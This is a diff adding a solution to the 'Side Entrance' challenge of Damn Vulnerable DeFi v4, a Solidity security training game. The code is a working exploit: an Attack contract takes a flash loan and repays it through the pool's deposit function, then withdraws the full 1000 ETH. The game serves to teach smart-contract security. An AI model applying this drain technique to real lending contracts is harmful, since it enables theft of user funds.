@@ -2,12 +2,12 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console, Vm} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
-    address player = makeAddr("player");
+    address payable player = payable(makeAddr("player"));
     address recovery = makeAddr("recovery");
 
     uint256 constant ETHER_IN_POOL = 1000e18;
@@ -45,7 +45,17 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack();
+        uint256 playerPk = uint256(keccak256(abi.encodePacked("player")));
+
+        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(attack), playerPk);
+        vm.attachDelegation(signedDelegation);        
+
+        Attack(player).addPoolAddress(address(pool));
+        pool.flashLoan(1000e18);
+        pool.withdraw();
+        (bool success,) = address(recovery).call{value: 1000e18}("");
+        require(success, "transfer to recovery failed");
     }
 
     /**
@@ -54,5 +64,20 @@ contract SideEntranceChallenge is Test {
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+    }
+}
+contract Attack {
+    address pool;
+    function addPoolAddress(address _pool) public {
+        pool = _pool;
+    }
+    function execute() external payable {
+        deposit();
+    }
+    function deposit() public {
+        SideEntranceLenderPool(pool).deposit{value: 1000e18}();
+    }
+    receive() external payable {
+
     }
 }
